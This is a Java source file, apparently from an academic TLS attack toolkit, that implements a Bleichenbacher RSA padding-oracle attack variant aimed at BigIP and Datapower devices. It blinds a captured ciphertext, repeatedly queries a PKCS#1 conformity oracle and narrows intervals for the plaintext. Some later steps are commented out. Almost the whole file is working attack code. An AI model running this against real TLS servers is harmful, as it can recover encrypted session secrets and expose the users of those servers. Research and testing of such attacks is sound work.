package de.rub.nds.ssl.attacker.bleichenbacher;

import de.rub.nds.ssl.attacker.bleichenbacher.oracles.AOracle;
import de.rub.nds.ssl.attacker.misc.Utility;
import java.io.BufferedWriter;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;

/**
 * Bleichenbacher algorithm for BigIP and Datapower
 */
public class BleichenbacherBigIP {

    protected final AOracle oracle;
    //protected final byte[] decryptedMsg;
    protected final byte[] encryptedMsg;
    protected final RSAPublicKey publicKey;
    protected BigInteger c0;
    protected BigInteger s0;
    protected BigInteger si;
    protected Interval[] m;
    protected final int blockSize;
    protected final BigInteger bigB;
    protected final BigInteger big256B;
    protected final boolean msgIsPKCS;
    protected BufferedWriter bw;
    
    public BleichenbacherBigIP(final byte[] msg,
            final AOracle pkcsOracle, final boolean msgPKCScofnorm) {
        this.encryptedMsg = msg.clone();
        this.publicKey = (RSAPublicKey) pkcsOracle.getPublicKey();
        this.oracle = pkcsOracle;
        this.msgIsPKCS = msgPKCScofnorm;
        c0 = BigInteger.ZERO;
        si = BigInteger.ZERO;
        m = null;

        this.blockSize = oracle.getBlockSize();

        // b computation
        int tmp = publicKey.getModulus().bitLength();
        while (tmp % Utility.BITS_IN_BYTE != 0) {
            tmp++;
        }
        tmp = ((tmp / Utility.BITS_IN_BYTE) - 2) * Utility.BITS_IN_BYTE;
        bigB = BigInteger.valueOf(2).pow(tmp);
        big256B = bigB.multiply(BigInteger.valueOf(256));
        System.out.println("B computed: " + bigB);
        System.out.println("Blocksize: " + blockSize + " bytes");
    }

    public void attack() throws OracleException {
        int i = 0;
        boolean solutionFound = false;

        System.out.println("Step 1: Blinding");
        if (this.msgIsPKCS) {
            System.out.println("Step skipped --> "
                    + "Message is considered as PKCS compliant.");
            s0 = BigInteger.ONE;
            c0 = new BigInteger(1, encryptedMsg);
            m = new Interval[]{
                new Interval(BigInteger.valueOf(2).multiply(bigB),
                (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE))};
        } else {
            stepOne();
        }

        i++;

//        while (!solutionFound) {
        System.out.println("Step 2: Searching for PKCS conforming messages.");
        stepTwo(i);

//            System.out.println("Step 3: Narrowing the set of soultions.");
//            stepThree(i);
//
//            System.out.println("Step 4: Computing the solution.");
//            solutionFound = stepFour(i);
//            i++;
//
//            System.out.println("// Total # of queries so far: "
//                    + oracle.getNumberOfQueries());
//        }
    }

    protected void stepOne() throws OracleException {
        BigInteger n = publicKey.getModulus();
        BigInteger ciphered = new BigInteger(1, encryptedMsg);

        boolean pkcsConform;
        byte[] tmp;
        byte[] send;

        do {
            si = si.add(BigInteger.ONE);
            send = prepareMsg(ciphered, si);

            // check PKCS#1 conformity
            pkcsConform = oracle.checkPKCSConformity(send);
        } while (!pkcsConform);

        c0 = new BigInteger(1, send);
        s0 = si;
        // mi = {[2B,3B-1]}
        m = new Interval[]{
            new Interval(BigInteger.valueOf(2).multiply(bigB),
            (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE))};

        System.out.println(" Found s0 : " + si);
    }

    protected void stepTwo(final int i) throws OracleException {
        byte[] send;
        BigInteger n = publicKey.getModulus();

        this.stepTwoX();

//        if (i == 1) {
//            this.stepTwoA();
//        } else {
//            if (i > 1 && m.length >= 2) {
//                stepTwoB();
//            } else if (m.length == 1) {
//                stepTwoC();
//            }
//        }
//
//        System.out.println(" Found s" + i + ": " + si);
    }

    protected void stepTwoX() throws OracleException {
        byte[] send;
        boolean pkcsConform;
        BigInteger n = publicKey.getModulus();

        System.out.println(" n / 256 B: "
                + Utility.bytesToHex(publicKey.getModulus().divide(big256B).toByteArray()));

        System.out.println("Step 2X: Starting the search");

        // the smallest possible multiplication value, which gives us (0x01 0x02),
        // when multiplying a message in <2B,3B)
        si = BigInteger.valueOf((256 / 3) - 1);

        BigInteger lowerBound = bigB.multiply(BigInteger.valueOf(2));
        BigInteger upperBound = bigB.multiply(BigInteger.valueOf(3));

        while (si.compareTo(BigInteger.valueOf(1500)) == -1) {

            si = si.add(BigInteger.ONE);
            send = prepareMsg(c0, si);

            // check PKCS#1 conformity
            pkcsConform = oracle.checkPKCSConformity(send);
            if (pkcsConform) {
                BigInteger[] bi = this.step2xComputeNewBound(si,
                        lowerBound, upperBound);
                if (bi != null) {
                    lowerBound = bi[0].subtract(BigInteger.ONE);
                    upperBound = bi[1].add(BigInteger.ONE);
                    System.out.println(Utility.bytesToHex(bi[0].toByteArray()));
                    System.out.println(Utility.bytesToHex(bi[1].toByteArray()));
                }
            }
        }
        System.out.println(si);
    }

    private BigInteger step3ComputeUpperBound(final BigInteger s,
            final BigInteger modulus, final BigInteger upperIntervalBound) {
        BigInteger upperBound = upperIntervalBound.multiply(s);
        upperBound = upperBound.subtract(BigInteger.valueOf(2).multiply(bigB));
        // ceil
        BigInteger[] tmp = upperBound.divideAndRemainder(modulus);
        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
            upperBound = BigInteger.ONE.add(tmp[0]);
        } else {
            upperBound = tmp[0];
        }

        return upperBound;
    }

    private BigInteger step3ComputeLowerBound(final BigInteger s,
            final BigInteger modulus, final BigInteger lowerIntervalBound) {
        BigInteger lowerBound = lowerIntervalBound.multiply(s);
        lowerBound = lowerBound.subtract(BigInteger.valueOf(3).multiply(bigB));
        lowerBound = lowerBound.add(BigInteger.ONE);
        lowerBound = lowerBound.divide(modulus);

        return lowerBound;
    }

    protected BigInteger[] step2xComputeNewBound(final BigInteger s,
            final BigInteger oldLowerBound, final BigInteger oldUpperBound) {

        for (int i = 1; i < 160; i++) {
            BigInteger upper = bigB.multiply(BigInteger.valueOf(i * 256 + 3));
            BigInteger lower = bigB.multiply(BigInteger.valueOf(i * 256 + 2));
            BigInteger newLower = lower.divide(s);
            BigInteger newUpper = upper.divide(s);
            if (newLower.compareTo(oldLowerBound) == 1
                    && newUpper.compareTo(oldUpperBound) == -1) {
                BigInteger[] bi = {newLower, newUpper};
                return bi;
            }
        }
        return null;
    }

    protected BigInteger step2cComputeLowerBound(final BigInteger r,
            final BigInteger modulus, final BigInteger upperIntervalBound) {
        BigInteger lowerBound = BigInteger.valueOf(2).multiply(bigB);
        lowerBound = lowerBound.add(r.multiply(modulus));
        lowerBound = lowerBound.divide(upperIntervalBound);

        return lowerBound;
    }

    protected BigInteger step2cComputeUpperBound(final BigInteger r,
            final BigInteger modulus, final BigInteger lowerIntervalBound) {
        BigInteger upperBound = BigInteger.valueOf(3).multiply(bigB);
        upperBound = upperBound.add(r.multiply(modulus));
        upperBound = upperBound.divide(lowerIntervalBound);

        return upperBound;
    }

    /**
     *
     * @param originalMessage original message to be changed
     * @param si factor
     * @return
     */
    protected byte[] prepareMsg(final BigInteger originalMessage,
            final BigInteger si) {
        byte[] msg;
        BigInteger tmp;

        if (oracle.getNumberOfQueries() % 100 == 0) {
            System.out.println("# of queries so far: " + oracle.
                    getNumberOfQueries());
        }

        // if we use a real oracle (not a plaintext oracle), the si value has
        // to be encrypted first.
        if (!oracle.isPlaintextOracle()) {
            // encrypt: si^e mod n
            tmp = si.modPow(publicKey.getPublicExponent(),
                    publicKey.getModulus());
        } else {
            tmp = si;
        }

        // blind: c0*(si^e) mod n
        // or: m*si mod n (in case of plaintext oracle)
        tmp = originalMessage.multiply(tmp);
        tmp = tmp.mod(publicKey.getModulus());
        // get bytes
        msg = Utility.correctSize(tmp.toByteArray(), blockSize, true);

        return msg;
    }
    
    public BigInteger getSi() {
        return si;
    }
}
